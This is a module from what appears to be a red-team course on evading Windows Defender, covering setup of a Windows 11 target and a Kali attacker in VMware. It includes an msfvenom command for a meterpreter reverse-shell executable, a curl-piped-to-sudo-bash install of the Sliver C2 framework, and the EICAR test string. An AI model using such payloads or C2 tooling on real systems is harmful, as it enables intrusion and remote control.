# Module 01 - Lab Setup

## Why You Need a Lab

You cannot practice red teaming techniques on real systems. That is
illegal. You also should not practice on your own main computer because
some of the tools and techniques we will use could damage your system
or trigger your own security software in ways that are hard to undo.

The solution is a lab. A lab is a set of virtual machines running on
your computer. A virtual machine is a full computer simulated in
software. It has its own operating system, its own files, its own
network. But it runs inside a window on your real computer.

If you break something in a virtual machine, you restore it from a
saved state called a snapshot and start over. No damage to your real
computer. No consequences.

Your lab will have two virtual machines:

The first is a **Windows 11 machine**. This is your target. It has
Windows Defender fully active and updated. This is what you will
practice attacking.

The second is a **Kali Linux machine**. This is your attacker box.
It comes pre-loaded with hundreds of hacking tools. This is where
you will run your attacks from.

Both machines will be connected through a private virtual network
so they can talk to each other. Both will also have internet access
so you can download updates and tools.

---

## What Your Computer Needs

Running two virtual machines at the same time takes some power. Here
is what your real computer needs.

At minimum, you need a CPU with 4 cores, 16 GB of RAM, and 120 GB
of free disk space. This will work but things might feel slow.

For a smooth experience, you want 6 or more cores, 32 GB of RAM,
and 250 GB of free space on an SSD. The SSD makes a big difference
because virtual machines do a lot of disk reading and writing.

To check your specs, press Windows Key + I to open Settings, then
go to System and then About. You will see your processor and RAM.
For disk space, open File Explorer and check your drives.

If you have less than 16 GB of RAM, you can still follow this course
but should only run one virtual machine at a time.

---

## What You Will Download

You need three things. All free.

**VMware Workstation Pro** is the software that runs virtual machines.
It used to cost money but became free for everyone in late 2024.
The download is about 600 MB.

**Windows 11 ISO** is the installer file for Windows 11. You get it
directly from Microsoft's website. No product key needed. The download
is about 5-6 GB.

**Kali Linux VM** is a pre-built virtual machine image from kali.org.
It comes ready to go with most hacking tools already installed. The
download is about 3-4 GB compressed.

Total download is around 10 GB. After everything is installed and set
up, your lab will take about 80-100 GB of disk space.

---

## Step 1: Download VMware Workstation Pro

VMware Workstation Pro is made by Broadcom (who bought VMware). You
download it from their support portal.

Go to the Broadcom support portal at https://support.broadcom.com.
You will need to create a free account if you do not have one.

To create an account, click Register in the top right. Fill in your
email, name, and country. Use a real email because you need to verify
it. After registering, check your email and click the verification
link. Then log in.

Once logged in, navigate to the VMware Desktop Hypervisor section.
Look for VMware Workstation Pro for Windows. Select the latest
version and download it.

If the Broadcom portal feels confusing - and many people complain
about it - try going directly to
https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion
which sometimes has a more straightforward download link.

Save the installer somewhere you can find it. The file will be
about 600 MB.

---

## Step 2: Install VMware Workstation Pro

Find the downloaded installer and double-click it. If Windows asks
whether you want to allow this app to make changes, click Yes.

The setup wizard walks you through the process. Click Next to start.
Accept the license agreement. On the install location screen, keep
the default path. There will be a checkbox that says "Add VMware
Workstation console tools into system PATH" - make sure this is
checked. It lets you use VMware commands from the terminal later.

On the user experience screen, you can uncheck both options about
updates and customer experience if you prefer. Keep the desktop and
start menu shortcuts enabled.

Click Install and wait about 5-10 minutes for it to finish. Click
Finish when done. If it asks you to restart your computer, do it now.

After restarting, open VMware Workstation Pro. If it asks about a
license, select the free or personal use option. You do not need a
license key. You should see the VMware home screen with options to
create or open virtual machines. If you see this, the installation
worked.

---

## Step 3: Download the Windows 11 ISO

Go to Microsoft's official download page at
https://www.microsoft.com/software-download/windows11 -
do not download Windows from any other website.

Scroll down until you find "Download Windows 11 Disk Image (ISO)
for x64 devices." Click the dropdown and select "Windows 11
(multi-edition ISO x64)." Click Download Now.

It will ask you to choose a language. Select English (United States)
or English International. English is recommended because most
security tools and documentation are in English.

Click Confirm, then click the 64-bit Download button. The file is
about 5-6 GB. Save it somewhere easy to find, like your Downloads
folder. On a fast connection this takes about 15 minutes. On a
slower connection it could take an hour or more.

You do not need a product key. Windows 11 runs without activation.
There will be a small "Activate Windows" watermark in the corner of
the screen, but everything works fine for lab use.

---

## Step 4: Create the Windows 11 Virtual Machine

Open VMware Workstation Pro. Click File then New Virtual Machine,
or click "Create a New Virtual Machine" on the home screen.

A wizard opens. Select **Custom (advanced)** and click Next. This
gives you more control over the settings.

On the hardware compatibility screen, keep the default (latest
version) and click Next.

When it asks about the installation source, select **"I will install
the operating system later."** Click Next. We set up the hardware
first and attach the ISO after.

For the guest operating system, select **Microsoft Windows** and set
the version to **Windows 11 x64**. If Windows 11 is not in the list,
select "Windows 10 and later x64" which works the same. Click Next.

Give the virtual machine a name. Something like **Win11-Target** works
well. Choose a location with enough free space. Avoid putting VMs on
your Desktop or Documents folder. A path like D:\VMs\Win11-Target or
C:\VMs\Win11-Target is better. Click Next.

On the firmware screen, select **UEFI** and check the **Secure Boot**
box. Windows 11 requires both of these. If you miss this step, Windows
will refuse to install. Click Next.

For processors, set the number of processors to 1 and the number of
cores per processor to 4. This gives the VM 4 CPU cores. Do not give
it more than half of your real CPU cores. Click Next.

For memory, set it to 4096 MB (4 GB) at minimum. If your computer has
32 GB of RAM, give the VM 8192 MB (8 GB). Never give a VM more than
half your total RAM. Click Next.

For network type, select **NAT**. This lets the VM share your internet
connection. Click Next.

For the I/O controller, keep the default and click Next. For the disk
type, keep the default and click Next.

Select **Create a new virtual disk** and click Next. Set the size to
**80 GB**. Select "Store virtual disk as a single file" because it is
faster. Click Next.

Keep the default disk file name and click Next. Review the summary and
click **Finish**. The VM is now created but Windows is not installed yet.

---

## Step 5: Add TPM and Attach the ISO

Windows 11 requires a TPM (Trusted Platform Module) to install. VMware
can create a virtual one.

Select your Win11-Target VM in VMware and click **Edit virtual machine
settings** (or right-click the VM and choose Settings).

In the settings window, click the **Add** button at the bottom. From
the list of hardware types, select **Trusted Platform Module** and
click Finish. You should now see it listed in the hardware.

If Trusted Platform Module is not in the list, VMware might need to
encrypt the VM first. If it offers to encrypt, accept it and set a
password. Remember this password because you need it to open the VM
in the future.

Now click on **CD/DVD (SATA)** in the hardware list. On the right side,
select **Use ISO image file** and click Browse. Navigate to your
downloaded Windows 11 ISO file and select it. Make sure "Connect at
power on" is checked.

Verify everything looks right: you should see TPM in the list, the
CD/DVD pointing to your ISO, at least 4 GB of memory, and 4 CPU cores.
Click OK.

---

## Step 6: Install Windows 11

Select the Win11-Target VM and click **Power on this virtual machine**.

When the VM starts, you will see a message that says "Press any key to
boot from CD or DVD." Click inside the VM window and press any key
quickly. If you miss it, the VM tries to boot from the empty hard disk
and fails. If that happens, go to VM then Power then Restart Guest and
try again, pressing a key faster this time.

The Windows Setup screen appears with a blue background.

Set the language to English (United States) or your preferred language.
Set the time format and keyboard layout for your region. Click Next.

Click **Install now**. Wait a moment for setup to start.

When it asks for a product key, click **I don't have a product key**.

Select **Windows 11 Pro**. Pro has features we need for testing, like
Group Policy Editor and Remote Desktop. Click Next. Accept the license
terms and click Next.

Choose **Custom: Install Windows only (advanced)**. Select the virtual
disk (it should show about 80 GB of unallocated space). Click Next.

Windows starts installing. This takes 10-20 minutes. The VM will
restart several times. This is normal. Do not press any keys during
the restarts - let it boot from the hard disk automatically.

After installation, the initial setup wizard starts.

Select your country and keyboard layout. When it tries to connect to
a network, let it connect through NAT.

Now comes the tricky part. Windows 11 wants you to sign in with a
Microsoft account. For a lab, you want a local account instead.

When it asks for your Microsoft account, type this as the email:

```
no@thankyou.com
```

Enter any password like "test123" and click Sign in. It will show an
error message. After the error, Windows lets you create a local
account instead.

If that method does not work, try this alternative: when you see the
network screen, press **Shift + F10** to open a command prompt. Type
the following command and press Enter:

```
oobe\bypassnro
```

The VM restarts. Go through setup again. This time there will be an
option that says "I don't have internet." Click that, then "Continue
with limited setup." Now you can create a local account.

For the local account, set the username to **redteam** and pick a
simple password like Password1. Remember it - you need it to log in.
Fill in the security questions with anything. On the privacy settings
screen, turn everything off and click Accept.

Wait for the desktop to appear. You now have a working Windows 11
virtual machine.

---

## Step 7: Install VMware Tools

VMware Tools makes the VM work much better. Without it, the screen
resolution is stuck at a low setting and you cannot copy-paste between
your real computer and the VM.

In the VMware menu bar, click **VM** then **Install VMware Tools**.

Inside the Windows VM, open File Explorer and click on This PC. You
should see a DVD drive labeled VMware Tools. Double-click it, then
double-click **setup64.exe**. If Windows asks for permission, click Yes.

In the setup wizard, click Next, select Complete, click Next, then
Install. Wait for it to finish and click Finish. It will ask you to
restart - click Yes.

After the restart, you should notice that the screen resolution adjusts
when you resize the VMware window, and you can copy-paste text between
your real computer and the VM.

---

## Step 8: Update Windows 11

You need Windows fully updated so you have the latest version of
Defender with the newest detection rules. We want to test against real,
current defenses.

Open Settings by pressing Windows Key + I. Click Windows Update in the
left panel. Click Check for updates.

Windows starts downloading and installing updates. This takes anywhere
from 15 minutes to an hour depending on your internet speed. When it
asks to restart, click Restart now.

After the restart, go back to Settings, then Windows Update, and click
Check for updates again. Sometimes there are more updates that only
appear after the first batch is installed. Keep repeating this until it
says "You're up to date" with no more updates available.

This is boring but necessary. A fully patched system is what you will
face on real targets.

---

## Step 9: Verify Defender Is Active

Open Windows Security by clicking Start and searching for "Windows
Security." Click on Virus and threat protection. You should see green
checkmarks and "No current threats."

Click on "Virus & threat protection settings" then "Manage settings."
Make sure all of these are turned on:

- Real-time protection
- Cloud-delivered protection
- Automatic sample submission
- Tamper Protection

Go back to the main Virus and threat protection page. Scroll down to
"Virus & threat protection updates" and click "Check for updates" to
make sure the signature database is current.

You can also verify from PowerShell. Right-click the Start button and
open Terminal as Administrator. Run this command:

```powershell
Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled, BehaviorMonitorEnabled, AntivirusSignatureLastUpdated
```

You should see True for the first three fields and a recent date for
the signature update. If everything shows True, Defender is fully
active and ready.

---

## Step 10: Take a Snapshot

This is one of the most important steps. Do not skip it.

A snapshot saves the exact state of your VM right now. If you mess
something up later - and you will, that is part of learning - you can
restore this snapshot and be back to a clean, working system in seconds.

In VMware, make sure the Win11-Target VM is running. Click **VM** in
the menu bar, then **Snapshot**, then **Take Snapshot**. Give it a name
like "Clean-Updated" and a description like "Fresh Windows 11, fully
updated, Defender active, VMware Tools installed." Click Take Snapshot.

To restore this snapshot later, go to VM, then Snapshot, then Snapshot
Manager. Select the snapshot and click Go To. Everything you did after
the snapshot is undone. The VM is exactly how it was when you took it.

Take snapshots before trying anything risky. This is your safety net.

---

## Step 11: Set Up Kali Linux

Kali Linux is a Linux distribution designed for penetration testing.
It comes with hundreds of security tools pre-installed - Metasploit,
Nmap, Burp Suite, and many more.

We use Kali as our attacker machine. The Windows VM is what we attack.
Kali is where we attack from.

The easy part: Kali provides pre-built VM images for VMware. You do
not need to install anything. You just download, extract, and open.

Go to https://www.kali.org/get-kali/ and click on Virtual Machines.
Find the VMware section and download the 64-bit image. The file is a
compressed .7z archive, about 3-4 GB.

You need 7-Zip to extract it. If you do not have 7-Zip, download it
from https://www.7-zip.org and install it. Then right-click the
downloaded Kali .7z file and choose 7-Zip, then Extract Here. The
extracted folder will be about 10-15 GB.

In VMware, click File then Open. Navigate to the extracted Kali folder
and find the file ending in **.vmx** - this is the VM configuration
file. Select it and click Open. Kali appears in your VMware library.

Before starting it, click Edit virtual machine settings. Give it at
least 2 GB of RAM (4 GB is better). Set the processors to 2 cores.
Make sure the network adapter is set to **NAT** - the same network
type as your Windows VM. Click OK.

Power on the Kali VM. If VMware asks whether you moved or copied it,
click "I Copied It." Wait for the login screen. The default username
is **kali** and the default password is **kali**.

After logging in, open a terminal by right-clicking the desktop and
selecting Open Terminal. Update everything:

```bash
sudo apt update && sudo apt full-upgrade -y
```

Type "kali" when it asks for the password. This update takes 10-30
minutes. When it finishes, restart:

```bash
sudo reboot
```

After the restart, take a snapshot of Kali too. In VMware, go to VM,
Snapshot, Take Snapshot. Name it "Kali-Clean-Updated."

---

## Step 12: Make Sure Both VMs Can Talk to Each Other

Your Windows VM and Kali VM need to be able to communicate. Since both
use NAT networking, they should be on the same virtual network segment.

First, find the IP address of each machine.

On Kali, open a terminal and run:

```bash
ip addr show
```

Look for the interface called eth0 or ens33. Find the line that says
inet followed by an IP address. It will be something like
192.168.44.128. Write this down.

On Windows, open PowerShell and run:

```powershell
ipconfig
```

Look for the Ethernet adapter section. Find the IPv4 Address line.
It will be something like 192.168.44.129. Write this down.

Now test the connection. From Kali, ping the Windows machine:

```bash
ping -c 4 192.168.44.129
```

Use your actual Windows IP address. You should see replies.

If the ping does not work, the Windows Firewall might be blocking it.
On the Windows VM, open PowerShell as Administrator and run:

```powershell
netsh advfirewall firewall add rule name="Allow Ping" protocol=icmpv4 dir=in action=allow
```

Then try the ping again from Kali.

From Windows, ping the Kali machine to test the other direction:

```powershell
ping 192.168.44.128
```

Use your actual Kali IP address. If both pings work, your VMs can
communicate.

To test file transfer, start a simple web server on Kali:

```bash
echo "Transfer test successful" > /tmp/test.txt
cd /tmp && python3 -m http.server 8080
```

On Windows, open the Edge browser and go to
http://YOUR-KALI-IP:8080/test.txt (replace YOUR-KALI-IP with the
actual IP). If you see "Transfer test successful," file transfers work.
Go back to Kali and press Ctrl+C to stop the server.

---

## Step 13: Install Tools on Kali

Kali comes with most tools pre-installed, but we need to add a few
things and verify everything works.

Open a terminal on Kali and check that Metasploit is installed:

```bash
msfconsole --version
```

If it shows a version number, you are good. If not, install it:

```bash
sudo apt install metasploit-framework -y
```

Install Sliver C2:

```bash
curl https://sliver.sh/install | sudo bash
```

This takes a few minutes. When it finishes, verify with:

```bash
sliver-server version
```

Install MinGW for cross-compiling C code for Windows:

```bash
sudo apt install mingw-w64 -y
```

Install Python encryption libraries we will use later:

```bash
pip3 install pycryptodome
```

Quick test that msfvenom works. This creates a test payload file - we
will not actually run it yet, just making sure the tool works:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.44.128 LPORT=4444 -f exe -o /tmp/test_payload.exe
```

If it creates the file without errors, msfvenom is working. You can
verify with:

```bash
ls -la /tmp/test_payload.exe
```

Quick test of Sliver. Start the server:

```bash
sliver-server
```

You should see the Sliver banner and a prompt. Type `help` to see
available commands, then type `exit` to quit.

---

## Step 14: Install Tools on Windows

On the Windows VM, we need a couple of things.

**System Informer** (formerly Process Hacker) shows you everything
happening inside processes - memory, DLLs, threads, network connections.
You will use this constantly throughout the course.

Open Edge in the Windows VM and go to
https://systeminformer.sourceforge.io/. Download the latest release
installer. Run it and click through the wizard with default settings.
When you open System Informer, it will ask to run as Administrator -
click Yes. You will see all running processes with detailed information.

**Python** is needed for some scripts and tools later in the course.
Go to https://www.python.org/downloads/ and download the latest
Python 3 for Windows. Run the installer. On the first screen, check
the box that says **Add Python to PATH** - this is important. Then
click Install Now. After installation, open PowerShell and verify:

```powershell
python --version
```

It should show Python 3 followed by a version number.

Now take fresh snapshots of both VMs since you have tools installed.

For the Windows VM: VM, Snapshot, Take Snapshot. Name it
"Win11-With-Tools."

For the Kali VM: VM, Snapshot, Take Snapshot. Name it
"Kali-With-Tools."

---

## Step 15: Final Check

Before moving on, let's make sure everything works with one last test.

On the Windows VM, open PowerShell and try this:

```powershell
$eicar = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
$eicar | Out-File -FilePath C:\Users\redteam\Desktop\test.txt
```

This creates the EICAR test file, which is a standard string that every
antivirus is designed to detect. It is not real malware - it is
specifically made for testing.

Defender should block it immediately. You will see a notification
saying a threat was found. If you see this notification, Defender is
working correctly on your lab machine.

If Defender does NOT block it, go back to Step 9 and make sure all
protections are turned on.

---

## Your Lab Layout

Here is what your lab looks like now:

```
YOUR REAL COMPUTER
|
+-- VMware Workstation Pro
    |
    +-- Win11-Target (Windows 11 Pro)
    |   Role: TARGET - what you attack
    |   Network: NAT
    |   Defender: Active and updated
    |   Tools: System Informer, Python
    |   Snapshots: Clean-Updated, Win11-With-Tools
    |
    +-- Kali-Attacker (Kali Linux)
        Role: ATTACKER - where you attack from
        Network: NAT
        Tools: Metasploit, msfvenom, Sliver, MinGW
        Snapshots: Kali-Clean-Updated, Kali-With-Tools
```

Both VMs are on the same virtual NAT network. They can reach each other
and they both have internet access.

---

## Troubleshooting

**Windows 11 says "This PC can't run Windows 11" during installation.**
Go back to Step 4 and make sure you added the TPM module. Also verify
that the firmware is set to UEFI with Secure Boot enabled. These were
set during VM creation in Step 4 but can also be checked in the VM
settings.

**The VMs cannot ping each other.** First check that both are set to
NAT in their network adapter settings. Then make sure the Windows
Firewall allows ping (the command to allow it is in Step 12). Also
check that the VMware NAT Service is running on your real computer -
press Windows Key + R, type services.msc, find VMware NAT Service, and
make sure its status is Running.

**VMware Tools will not install.** Make sure the VM is powered on
before clicking VM then Install VMware Tools. If no DVD drive appears
in File Explorer, wait a moment and check again. Sometimes it takes a
few seconds to mount.

**Kali Linux is very slow.** Give it more RAM (at least 2 GB, 4 GB is
better) and more CPU cores in the VM settings. Also install open-vm-tools
if it is not already installed:

```bash
sudo apt install open-vm-tools open-vm-tools-desktop -y
sudo reboot
```

**Cannot find VMware on the Broadcom portal.** The portal can be
confusing. Search Google for "VMware Workstation Pro download 2026"
and look for results from vmware.com or broadcom.com. Video tutorials
on YouTube showing the exact clicks can be very helpful.

**Defender did not catch the EICAR test file.** Open Windows Security,
go to Virus and threat protection, and verify real-time protection is
on. Update signatures from PowerShell with Administrator privileges:

```powershell
Update-MpSignature
```

Then try the EICAR test again.

---

## What Is Next

Your lab is ready. You have a Windows 11 target with Defender active
and a Kali Linux attacker with all the tools you need. They can talk
to each other and you have snapshots to fall back on.

The next module covers Windows internals. Before you can bypass
security, you need to understand how Windows runs programs, how
programs talk to the operating system, and where security products
fit into that picture. This foundation makes everything that comes
after it much easier to understand.

---

Next: [Module 02 - Windows Internals for Red Teamers](./02_WINDOWS_INTERNALS.md)

---

*This course is for authorized security testing and education only.
Always get written permission before testing any system.
The author is not responsible for misuse of this information.*
